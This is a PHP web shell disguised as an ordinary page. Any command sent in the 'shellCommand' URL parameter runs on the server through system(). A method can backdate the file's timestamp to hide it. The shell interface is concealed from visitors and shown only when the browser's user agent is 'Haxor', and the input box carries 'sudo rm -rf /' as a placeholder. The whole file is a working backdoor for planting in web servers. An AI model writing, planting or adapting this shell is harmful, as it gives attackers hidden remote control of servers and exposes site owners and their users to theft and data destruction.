<?php
	error_reporting(E_ALL);
	
	$ip = $_SERVER['SERVER_ADDR'];
	$port = $_SERVER['SERVER_PORT'];
	$file = basename(__FILE__); 
	$connectstr = "http://".$ip.":".$port."/".$file;

	class UserInterface
	{
		public $pwd = "";
		private $currentUser = "";
		private $mode = "r";
		private $errorToo = '2>&1';
		private $command = "";

		public function doCommand($command)
		{
			return system($command." 2>&1");
		}
		
		public function getPwd()
		{
			$this->doCommand("/bin/pwd");
		}

		public function cd($path)
		{
			chdir($path);
		}

		public function timeStamp($stamp)
		{
			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
		}
	}

	$userInterface = new UserInterface();
?>


<?php if (isset($_GET['command']) || isset($_GET['shellCommand'])): ?>
<?php
	if(isset($_GET['command'])) {
		$command = $_GET['command'];
		switch($command) {
			case "pwd":
				$userInterface->getPwd();
				break;
			case "perm":
				$permissions = $userInterface.getPermissions();
				break;
			case "ps":
				$processes = $userInterface.getProcesses();
				break;
		}
	}
	
	if(isset($_GET['shellCommand'])) {
		$myCommand = $_GET['shellCommand'];
		$shellOut = $userInterface->doCommand($myCommand);
	}


?>
<?php else: ?>

<div id="luserContent">
<%= $page %>
</div>


<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

<div id="haxored" hidden="true">

<style rel="stylesheet" type="text/css">
#XmenuNav {
	background-color: #161616;
	float: center;
	width: 100%;
	height: 7%;
}

#menuNav ul {
	float: center;
}

#XmenuNav ul li {
	list-style-type: none;
	display: inline;
}

#XmenuNav #home {
	background-color: #2d2d2d;
	color: #fff;
	border: 0px;
}


#XmenuNav li button {
	height: 100%;
	border: 0px;
	padding: 0 10px;	
	float: left;
	color: #605e56;
	background-color: #161616;
}

#XmenuNav li button:hover {
	background-color: #2d2d2d;
	color: #fff;
	border: 0px;
}

#XmenuStats ul li {
	color: #cad0c4;
	float: right;
	padding: 12px 10px;
	margin-right: 30px;
}

#XmainShell {
	height: 90%;
	padding: 20px 0px;
	margin: 0px;
	background-color: #1f1f1f;
	color: #fff;
	width: 100%;
}

#XinputShell {
	margin-left: 3%;
	margin-right: 3%;
	padding-left: 2%;
	padding-right: 2%;
}


#XinputShell input {
	width: 100%;
	height: 50px;
	border: 0px;
	outline: none;
	padding-left: 10px;
	font-family: monospace;
	font-size: 15px;
	color: #cad0c4;
	background-color: #323232;
}

#XShellContainer {
	margin-top: 2%;
	margin-left: 5%;
	margin-right:5%;
	padding-left: 2%;
	padding-right: 0px;
	background-color: #2d2d2d;
	height: 80%;
}

#XShellOutput {
	height: 100%;
	width: 100%;
	overflow: auto;
	font-family: monospace;
	padding-top: 15px;
}


#XShellOutput pre {
	display: inline;
}

#XShellOutput .command {
	color: #1793d1;
}

#XShellOutput .output {
	color: #cad0c4;
	padding-bottom:40px;
}

</style>
<div id="Xcontainer">
	<div id="XmenuNav">
		<form action="" id="XmenuForm">
		<ul class="XmenuOptions">
			<li><button id="home"> Home </button></li>
			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
			<li><button id="XbuttonPerm" name="command" value="whoami">Permissions</button></li>
			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
			<li><button id="XbuttonIfconfig" name="command" value="ifconfig">Networking</button></li>
		</ul>
		<div id="XmenuStats">
			<ul>
				<li id="XPHPversion"> PHP </li>
			</ul>
		</div>
		</form>
	<br>
	</div>
	<div id="XmainContainer">
		<div id="XmainShell">
			<div id="XShellContainer">
				<div id="XShellOutput">
				</div>
			</div>
			<div id="XinputShell">
				<input type="text" placeholder="sudo rm -rf /" id="shellInput">
			</div>
		</div>
	
	<script type="text/javascript">	
		$(document).ready( function() {

			var history = [];
			var counter = 0;

			function submit(command) {
				history.push(command);
				$.ajax({
					url: "<?php echo $connectstr; ?>",
					type: "GET",
					data: {"shellCommand": command},
					success: function(data) {
					renderCmd(command, data)
				}
			});
		}

		var user = "badass";
		var hostname = "microserver";

		function renderCmd(command, output) {
			var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
			$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
			$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
			$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
		}
	
		var request = "";

	
		$("#XbuttonPwd").on('click', function(e) {
			e.preventDefault();
			request = "pwd";
			submit(request);
		});

		$("#XbuttonPerm").on('click', function(e) {
			e.preventDefault();
			request = "perm";
			submit(request);
		});

		$("#XbuttonPs").on('click', function(e) {
			e.preventDefault();
			request = "ps";
			submit(request);
		});


		$("#XbuttonIfconfig").on('click', function(e) {
			e.preventDefault();
			request = "ifconfig";
			submit(request);
		});

		var inputshell = document.getElementById("XinputShell");
		inputshell.addEventListener("keydown", function(e) {
			if (e.which == 13) {
				submit($("#shellInput").val());
				$("#shellInput").val("");
			}
		
			if (e.which == 38 && counter < history.length) {
				counter += 1;
			
				$("#shellInput").val(history[history.length - counter]);
			}

			if (e.which == 40 && counter > 0) {
				counter -= 1;
				$("#shellInput").val(history[history.length - counter]);
			}

			if (e.keyCode == 90 && e.ctrlKey) {
				$("#XShellOutput").empty();
			}
		});

		$("#XPHPversion").text("<?php echo 'Current PHP Version: ' . phpversion(); ?>");
	});

	$(document).ready(function() {
		if(navigator.userAgent == "Haxor") {
			console.log("Hello Master.")
			$("body").css({"margin":"0px"});
			$("#luserContent").remove();
			$("#haxored").prop("hidden", false);
		} else {
			console.log("#");	
			$("#haxored").remove();
		}
	});
</script>
</div>
<!-- Below here should be the closing </body> tag -->
<?php endif; ?>

